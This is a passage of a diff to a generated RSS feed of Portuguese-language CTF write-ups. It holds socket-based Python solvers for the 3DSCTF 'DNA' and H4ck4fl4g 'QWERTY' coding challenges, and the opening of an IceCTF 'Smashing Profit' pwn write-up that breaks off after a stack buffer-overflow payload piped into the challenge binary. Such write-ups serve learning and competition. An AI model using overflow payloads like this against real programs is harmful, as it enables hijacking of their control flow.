+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;#print &apos;[DEBUG]\n%s\n&apos; % r
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;:&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;[&amp;lt;] %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&amp;gt;] %s&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;-------------------------------&apos;&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;[ ROUND #%s ]&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;[&amp;lt;] %s&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Stage&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Stage&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;ans&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;countDiff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ans&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;[&amp;gt;] %s&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ans&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;-----------------------------&apos;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Sat, 17 Dec 2016 00:00:00 -0200</pubDate>
+        <link>http://localhost:4000/2016/DNA-3DSCTF-2016</link>
+        <guid isPermaLink="true">http://localhost:4000/2016/DNA-3DSCTF-2016</guid>
+        
+        <category>3DSCTF</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>QWERTY - H4ck4fl4g  Final 2016</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;CTF:&lt;/strong&gt; H4ck4fl4g Final 2016&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Challenge:&lt;/strong&gt; QWERTY&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Category:&lt;/strong&gt; Coding&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Author:&lt;/strong&gt; Gabriel “AstuteJoe” Garcia&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Solved by:&lt;/strong&gt; RTFM[ChOkO]&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Description: Um erro comum de digitação nas mensagens é digitar a tecla ao lado. Você deve decodificar 5 mensagens onde as letras estão trocadas pelas letras a sua esquerda. (Exemplo.. W por Q e K por J) Obs: Só existem letras maiúsculas e espaços e a letra Z é mapeada para o L e A para P e Q para M. IP: 172.16.10.31 PORTA: 3031  &lt;br /&gt;
+&lt;em&gt;**&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;traduz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;dict&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Q&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;W&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;W&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;E&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;E&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;R&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;R&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;T&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;T&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Y&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Y&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;U&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;U&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;I&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;I&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;O&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;O&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;P&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;P&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;S&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;S&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;D&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;D&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;F&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;F&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;G&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;G&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;H&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;H&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;J&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;J&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;K&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;K&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;L&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;L&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Z&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;X&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;X&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;C&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;C&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;V&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;V&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;B&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;B&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;N&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;N&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;M&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;M&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Q&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3031&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;chall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#for i in xrange(6):
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;DESEC&apos;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;chall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#print &apos;[DEBUG] chall = %s&apos; % chall
+&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;[&amp;lt;] %s&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chall&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;traduz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;[&amp;gt;] %s&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;------------------------------&apos;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Fri, 18 Nov 2016 00:00:00 -0200</pubDate>
+        <link>http://localhost:4000/2016/QWERTY-Coding-H4ck4fl4g-Final-2016</link>
+        <guid isPermaLink="true">http://localhost:4000/2016/QWERTY-Coding-H4ck4fl4g-Final-2016</guid>
+        
+        <category>H4ck4fl4g</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Smashing Profit - IceCTF 2016 (60 pts)</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;CTF:&lt;/strong&gt; IceCTF 2016&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Challenge:&lt;/strong&gt; Smashing Profit (60 pts)&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Category:&lt;/strong&gt; Pwn&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Solved by:&lt;/strong&gt; RTFM[ChOkO]&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Description: N/A&lt;br /&gt;
+&lt;em&gt;**&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;╭─ctf-40870@icectf-shell-2016 /home/profit  
+╰─➤  python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print &quot;A&quot; * 76 + &quot;\x0b\x85\x04\x08&quot;&apos;&lt;/span&gt; | ./profit
+Smashing the stack &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;fun and...?
